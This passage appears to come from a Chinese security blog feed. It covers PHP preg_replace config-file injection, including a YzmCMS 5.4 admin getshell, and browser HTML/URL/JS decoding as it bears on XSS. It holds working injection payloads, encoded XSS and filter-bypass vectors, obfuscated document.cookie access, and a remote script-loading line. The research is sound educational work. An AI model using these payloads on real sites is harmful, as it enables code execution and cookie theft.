<h4 id="define情况下的贪婪且无-s修饰"><a href="#define情况下的贪婪且无-s修饰" class="headerlink" title="define情况下的贪婪且无/s修饰"></a>define情况下的贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>因为有不可闭合的单引号，所以这种情况下无法使用$0</p>
<p>不过可以使用这个trick: <code>preg_replace</code> 在替换的时候会吃掉转义符 来进行引号闭合</p>
<p>preg_match可将<code>\\</code>转化为<code>\</code> <strong>这也就意味着…其实用这种方式可以逃逸掉这篇文章里所有的单引号</strong></p>
<p>Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">api&#x3D;a\%27);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>得到的配置文件内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;API&#39;, &#39;a\\&#39;);phpinfo();&#x2F;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的非贪婪且有-s修饰"><a href="#define情况下的非贪婪且有-s修饰" class="headerlink" title="define情况下的非贪婪且有/s修饰"></a>define情况下的非贪婪且有/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的非贪婪且无-s修饰"><a href="#define情况下的非贪婪且无-s修饰" class="headerlink" title="define情况下的非贪婪且无/s修饰"></a>define情况下的非贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<p>第一种</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h3 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h3><h4 id="YzmCMS-5-4后台getshell"><a href="#YzmCMS-5-4后台getshell" class="headerlink" title="YzmCMS 5.4后台getshell"></a>YzmCMS 5.4后台getshell</h4><p>漏洞函数如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_config</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">    $configfile = YZMPHP_PATH.<span class="string">'common'</span>.DIRECTORY_SEPARATOR.<span class="string">'config/config.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_writable($configfile)) showmsg(<span class="string">'Please chmod '</span>.$configfile.<span class="string">' to 0777 !'</span>, <span class="string">'stop'</span>);</span><br><span class="line">    $pattern = $replacement = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($config <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">        $pattern[$k] = <span class="string">"/'"</span>.$k.<span class="string">"'\s*=&gt;\s*([']?)[^']*([']?)(\s*),/is"</span>;</span><br><span class="line">        $replacement[$k] = <span class="string">"'"</span>.$k.<span class="string">"' =&gt; \$&#123;1&#125;"</span>.$v.<span class="string">"\$&#123;2&#125;\$&#123;3&#125;,"</span>;                    </span><br><span class="line">    &#125;</span><br><span class="line">    $str = file_get_contents($configfile);</span><br><span class="line">    $str = preg_replace($pattern, $replacement, $str);</span><br><span class="line">    <span class="keyword">return</span> file_put_contents($configfile, $str, LOCK_EX);       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到$replacement变量是由字符拼接而来，并且${1}匹配的是单引号，那么我们就可以用$1来闭合前面的单引号，${1}等价于$1的，接着跟进调用了set_config的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        yzm_base::load_common(<span class="string">'function/function.php'</span>, <span class="string">'admin'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'mail_inbox'</span>]) &amp;&amp; $_POST[<span class="string">'mail_inbox'</span>])&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_email($_POST[<span class="string">'mail_inbox'</span>])) showmsg(L(<span class="string">'mail_format_error'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload_types'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'upload_types'</span>])) showmsg(<span class="string">'允许上传附件类型不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $arr = <span class="keyword">array</span>();</span><br><span class="line">            $config = D(<span class="string">'config'</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">                <span class="keyword">if</span>(in_array($key, <span class="keyword">array</span>(<span class="string">'site_theme'</span>,<span class="string">'watermark_enable'</span>,<span class="string">'watermark_name'</span>,<span class="string">'watermark_position'</span>))) &#123;</span><br><span class="line">                    $value = safe_replace(trim($value));</span><br><span class="line">                    $arr[$key] = $value;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>($key!=<span class="string">'site_code'</span>)&#123;</span><br><span class="line">                        $value = htmlspecialchars($value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $config-&gt;update(<span class="keyword">array</span>(<span class="string">'value'</span>=&gt;$value), <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$key));</span><br><span class="line">            &#125;</span><br><span class="line">            set_config($arr);</span><br><span class="line">            delcache(<span class="string">'configs'</span>);</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看出是从POST取值并且检查key是否在规定的数组中，如果在的话，进行一次内容过滤，然后赋给$arr数组，并且由于array数组中键可以对应着函数</p>
<p>比如 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x3D;&gt;&#39;x&#39;,foo()</span><br></pre></td></tr></table></figure>

<p>所以直接赋值为我们之前单引号闭合的payload就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$1,payload,$1</span><br></pre></td></tr></table></figure>

<h4 id="一个常见的绕过"><a href="#一个常见的绕过" class="headerlink" title="一个常见的绕过"></a>一个常见的绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^want$/'</span>, $_GET[<span class="string">'exp'</span>]) &amp;&amp; $_GET[<span class="string">'exp'</span>] !== <span class="string">'want'</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test"</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对于这个过滤条件 我们可以用exp=want%0a进行绕过</p>
<p>原理为$可以对换行符进行匹配</p>
<p>同样的漏洞还有Apache换行解析漏洞，也就是shell.php\n可以以php的形式解析，也是利用了$可以匹配换行符导致的。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p>
]]></content>
      <tags>
        <tag>PHP正则安全研究</tag>
      </tags>
  </entry>
  <entry>
    <title>从浏览器渲染与解码原理重新认识xss</title>
    <url>/2020/02/14/%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%8E%9F%E7%90%86%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86xss/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>从浏览器渲染的角度重新理解一下xss</p>
<h3 id="浏览器的渲染原理"><a href="#浏览器的渲染原理" class="headerlink" title="浏览器的渲染原理"></a>浏览器的渲染原理</h3><p>目前主要的两个渲染引擎为 webkit和Gecko</p>
<p>Geoko为Firefox使用，而Chrome和Safari主要使用是Webkit</p>
<a id="more"></a>

<p>Webkit渲染引擎流程如下：</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/2/22/161bb3c9b220f8cb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p>
<p>渲染的五个步骤如下：</p>
<blockquote>
<ol>
<li>处理 HTML 标记并构建 DOM 树。</li>
<li>处理 CSS 标记并构建 CSSOM 树。</li>
<li>将 DOM 与 CSSOM 合并成一个渲染树。</li>
<li>根据渲染树来布局，以计算每个节点的几何信息。</li>
<li>将各个节点绘制到屏幕上。</li>
</ol>
</blockquote>
<h4 id="CSSOM树与DOM树的构建"><a href="#CSSOM树与DOM树的构建" class="headerlink" title="CSSOM树与DOM树的构建"></a>CSSOM树与DOM树的构建</h4><p>对于DOM树：浏览器接受HTML文档后，将遍历文档节点，生成DOM树。</p>
<p>对于CSSOM树：浏览器解析CSS文件生成CSS规则树，每个CSS文件被分析为包含着CSS规则的StyleSheet对象。</p>
<h4 id="渲染阻塞"><a href="#渲染阻塞" class="headerlink" title="渲染阻塞"></a>渲染阻塞</h4><p>DOM树构建过程中会收到css和javascript的阻塞，</p>
<p>在构建过程中，如果遇见js脚本则会去执行，那么就会影响DOM树构建。</p>
<p>但是css文件的优先性是大于js的优先性的</p>
<p>在浏览器解析html的时候，会把新来的元素插入dom树种，并且同时查找css，把对应的样式规则应用到元素身上。</p>
<p>所以css和js的文件放置顺序一般为：css优先，js最后。</p>
<h3 id="浏览器的解码"><a href="#浏览器的解码" class="headerlink" title="浏览器的解码"></a>浏览器的解码</h3><h4 id="浏览器的解码规则"><a href="#浏览器的解码规则" class="headerlink" title="浏览器的解码规则"></a>浏览器的解码规则</h4><ul>
<li>HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树</li>
<li>javascript 或者 CSS解析器对内联脚本进行解析，完成JS CSS解码</li>
<li>URL解码会根据URL所在的顺序不同而在JS解码前或者解码后</li>
</ul>
<h4 id="HTML解码器"><a href="#HTML解码器" class="headerlink" title="HTML解码器"></a>HTML解码器</h4><p>html中五类元素如下：</p>
<ol>
<li>空元素(Void elements)，如<code>&lt;area&gt;</code>,<code>&lt;br&gt;</code>,<code>&lt;base&gt;</code>等等</li>
<li>原始文本元素(Raw text elements)，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code></li>
<li>RCDATA元素(RCDATA elements)，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></li>
<li>外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素</li>
<li>基本元素(Normal elements)，即除了以上4种元素以外的元素</li>
</ol>
<p>五类元素的特点：</p>
<ol>
<li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li>
<li>原始文本元素，可以容纳文本。</li>
<li>RCDATA元素，可以容纳文本和字符引用。</li>
<li>外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释</li>
<li>基本元素，可以容纳文本、字符引用、其他元素和注释</li>
</ol>
<h4 id="javascript解码器"><a href="#javascript解码器" class="headerlink" title="javascript解码器"></a>javascript解码器</h4><p>javascript解码器有一个特点，就是无法试别编码后的控制字符，比如：单引号，双引号和圆括号，之后会用一些例子进行详细说明。</p>
<h4 id="URL解码器"><a href="#URL解码器" class="headerlink" title="URL解码器"></a>URL解码器</h4><p>对url编码后的数据进行解码，需要注意的一点是，协议不能进行编码，否则URL解码器将无法试别。</p>
<p>下面是一些例子来更好的理解着三个编码器的作用</p>
<h4 id="例子测试"><a href="#例子测试" class="headerlink" title="例子测试"></a>例子测试</h4><p>1.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>URL encode “javascript:alert(1)”</p>
<p>此js代码无法执行，href属性内部为url编码的数据，所以URL解码器会进行处理，但是无法试别编码后的javascript协议，所以不会进行解码，也就无法执行。</p>
<p>在URL的规定，用户名，密码，协议都必须是ASCII。</p>
<p>2.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>前面的HTML编码数据解码为javascript，后面的URL解码为alert(2)</p>
<p>此js可以执行</p>
<p>浏览器解码流程为，先丢给HTML解码器，解码后为</p>
<p>javascript+urlencode(data)</p>
<p>此时URL解码器可以试别协议名称，所以会进行URL解码</p>
<p>最后被执行js代码</p>
<p>3.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript%3aalert(3)&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>同一，URL解码器无法识别协议名称，无法解码，最终js无法被执行。</p>
<p>4.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src&#x3D;x onerror&#x3D;alert(4)&amp;#62;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<p>这里的<code>&amp;#60;</code>虽然会被解码为&lt;，但是无法进入标签开始状态，因为这里的<code>&amp;#60;</code>是相当于字符串的，并不是相当于真正的标签，所以alert并不会被执行。</p>
<p>5.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;&#x2F;script&amp;#62;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;textarea&gt;</code>是RCDATA元素，可以容纳文本和字符引用，也就是说textarea标签里的内容可以被html解码，但是textarea中无法容纳其他标签，js代码不会被执行。</p>
<p>6.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;&#x2F;script&gt;&lt;&#x2F;textarea&gt;</span><br></pre></td></tr></table></figure>

<p>和刚才是一样的，textarea标签中无法容纳其他标签。</p>
<p>7.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;7&#39;);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>HTML实体解码将<code>&amp;#39;</code>解码为’，并且前面为onclick属性，丢给js引擎处理，成功执行弹窗。</p>
<p>8.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;button onclick&#x3D;&quot;confirm(&#39;8\u0027);&quot;&gt;Button&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure>

<p>js中只有字符串和标识符可以用unicode来表示，所以js无法将unicode编码后的单引号解码，所以无法执行此js脚本</p>
<p>9.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>script标签无法容纳字符引用，所以无法进行HTML解码，直接交给js来处理，无法执行此代码</p>
<p>10.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>前五个字符js解码后为alert标识符，而js是可以解码标识符的，所以可以成功执行js</p>
<p>11.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>有括号，无法试别控制字符，无法执行</p>
<p>12.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这个挺有趣的，\u0031\u0032被翻译为12，不过这个12是字符串类型的，并非数字类型的，需要引号，这里没有引号，无法执行。</p>
<p>13.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;14\u000a&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>\u000a为换行字符，可以只执行</p>
<p>14.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;&quot;&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>第一步解码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)</span><br></pre></td></tr></table></figure>

<p>URL解码器可试别，交给URL解码器处理，第二步解码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:\u0061\u006c\u0065\u0072\u0074(15)</span><br></pre></td></tr></table></figure>

<p>最后由js解码器解码，然后执行js</p>
<p>从上面的例子我们可以看出几个关键点：</p>
<p>1.js解码器只会对字符串和标识符进行js解码</p>
<p>2.RCDATA元素(textarea)，可以容纳实体引用，也就是可以进行HTML解码操作，但其实子元素是无法执行的</p>
<p>3.URL解码需要进行协议识别后才能进行解码</p>
<p>4.原始文本元素中无法进行URL解码和HTML解码</p>
<h4 id="实战例子"><a href="#实战例子" class="headerlink" title="实战例子"></a>实战例子</h4><h5 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h5><p>这个例子选取了Wooyun中的一个例子</p>
<p>漏洞点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:location&#x3D;&#39;.&#x2F;3.3.php?offset&#x3D;&#39;+document.getElementById(&#39;pagenum&#39;).value+&#39;&amp;searchtype_yjbg&#x3D;yjjg&amp;searchvalue_yjbg&#x3D;&#39;&quot;&gt;GO&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>我们输入的searchvalue_yjbg参数会随着这个a标签一起插入到页面源码中</p>
<p>首先页面是对单引号进行了过滤，我们无法执行输入单引号去进行闭合，但是我们可以输入进行HTML编码后的单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wooyun%26%23x27,alert(1)%2b%26%23x27</span><br></pre></td></tr></table></figure>

<p>解析过程为：首先进行HTML解码，将这些HTML编码解析为对应的字符串，此时他并不会进行闭合，只有在执行js代码的时候，js引擎将这些字符串再一遍解析，而这个之前被当作字符串的单引号就起到了闭合的作用，最终执行了我们的自定义的js代码，像这样的例子还有一些，我们接着来举一些。</p>
<h5 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src &#x3D; &quot;https:&#x2F;&#x2F;text.com&quot; onclick &#x3D; &#39;alert(&quot;输入点&quot;)&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>在过滤掉单引号的情况下我们可以通过实体编码的方式进行Bypass，解析的流程也和之前的一样，先进行HTML解码将我们的闭合双引号解析为字符串，再在js引擎处理这段js代码的过程中产生闭合注入</p>
<h5 id="例三"><a href="#例三" class="headerlink" title="例三"></a>例三</h5><p>这个是先知文章中的一个例子，感觉蛮经典的，拿来引用一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a onclick&#x3D;&quot;window.open(&#39;value1&#39;)&quot; href&#x3D;&quot;javascript:window.open(value2)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>对于value1: 先进行HTML解码，由于onclick再进行js解码，最后由于window.open函数进行URL解码。</p>
<p>对于value2，先HTML解码，由于href属性进行一次URL解码，由于javascript协议，进行js解码，最后由于window.open再URL解码，所以在这个例子中一共进行了两次URL解码。</p>
<h4 id="新增的HTML5实体编码带来的安全问题"><a href="#新增的HTML5实体编码带来的安全问题" class="headerlink" title="新增的HTML5实体编码带来的安全问题"></a>新增的HTML5实体编码带来的安全问题</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;colon; 冒号</span><br><span class="line">&amp;NewLine; 换行</span><br></pre></td></tr></table></figure>

<p>Bypass Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>HTML解码后，即可执行</p>
<h4 id="浏览器的词法分析器"><a href="#浏览器的词法分析器" class="headerlink" title="浏览器的词法分析器"></a>浏览器的词法分析器</h4><p>对于下面JS的执行成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javasc</span><br><span class="line">ript:alert(1)&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器中的解析器中词法分析器起的作用会跳过空白跟换行之类的无效字符</p>
<p>onerror=的换行Bypass也是利用了这个词法分析器进行实现的</p>
<h3 id="XSS的一些技巧"><a href="#XSS的一些技巧" class="headerlink" title="XSS的一些技巧"></a>XSS的一些技巧</h3><p>通过top,windows对象来Bypass某些关键词</p>
<p>详细的看这篇文章好了</p>
<p><a href="https://www.anquanke.com/post/id/176185" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176185</a></p>
<h3 id="JavaScript全局变量绕过XSS过滤器"><a href="#JavaScript全局变量绕过XSS过滤器" class="headerlink" title="JavaScript全局变量绕过XSS过滤器"></a>JavaScript全局变量绕过XSS过滤器</h3><p>举几个例子就可以懂了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">self[&quot;\x61\x6c\x65\x72\x74&quot;](</span><br><span class="line">    self[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;]</span><br><span class="line">        [&quot;\x63\x6f\x6f\x6b\x69\x65&quot;]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>这里的self可以被如下代替：</p>
<p>• window</p>
<p>• self</p>
<p>• _self</p>
<p>• this</p>
<p>• top</p>
<p>• parent</p>
<p>• frames</p>
<h4 id="jQuery的变异"><a href="#jQuery的变异" class="headerlink" title="jQuery的变异"></a>jQuery的变异</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self[&quot;$&quot;][&quot;globalEval&quot;](&quot;alert(1)&quot;);</span><br><span class="line">&#x2F;&#x2F;这里我也可以变异的很复杂</span><br><span class="line">self[&quot;$&quot;][&quot;getScript&quot;](&quot;Your_vps&quot;);</span><br><span class="line">&#x2F;&#x2F;加载远程脚本</span><br></pre></td></tr></table></figure>

<h4 id="Object迭代"><a href="#Object迭代" class="headerlink" title="Object迭代"></a>Object迭代</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Object.keys(self)[145]</span><br><span class="line">&lt; &quot;alert&quot;</span><br><span class="line">&gt; self[Object.keys(self)[145]](&quot;foo&quot;) &#x2F;&#x2F; alert(&quot;foo&quot;)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/1bsdcF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/12/1bsdcF.png" alt="1bsdcF.png"></a></p>
<p>首先通过迭代遍历出alert或者其他想要获得函数的位置</p>
<p>在平时我们在或者cookie的时候，一般用的是document.cooie，通过全局变量的bypass我们可以大大将或者cookie的语句复杂化进而Bypass掉某些规则</p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self[Object.keys(self)[9]][&quot;\x63\x6f\x6f\x6b\x69\x65&quot;]</span><br></pre></td></tr></table></figure>

<p>我再弄的复杂点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self[Object.keys(self)[9]][self[Object.keys(self)[171]](&#39;Y29va2ll&#39;)]</span><br></pre></td></tr></table></figure>

<p>这个索引号同样也可以复杂化</p>
<p>定义一个a函数，这个a函数代表的就是查找索引号的结果，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;()&#x3D;&gt;&#123;c&#x3D;0;for(i in self)&#123;if(&#x2F;^a[rel]+t$&#x2F;.test(i))&#123;return c&#125;c++&#125;&#125; &#x2F;&#x2F;找到索引</span><br><span class="line"></span><br><span class="line">self[Object.keys(self)[a()]](&quot;1&quot;)</span><br><span class="line">&#x2F;&#x2F;弹窗</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/5863" target="_blank" rel="noopener">https://xz.aliyun.com/t/5863</a></p>
<p><a href="https://xz.aliyun.com/t/5950#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5950#toc-13</a></p>
<p><a href="http://drops.xmd5.com/static/drops/tips-689.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-689.html</a></p>
<p><a href="https://blog.zeddyu.info/2019/03/13/Web安全从零开始-XSS-I/#Encode" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/#Encode</a></p>
<p><a href="https://www.anquanke.com/post/id/176185#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176185#h3-7</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/75785844" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/75785844</a></p>
]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>浏览器渲染</tag>
      </tags>
  </entry>
  <entry>
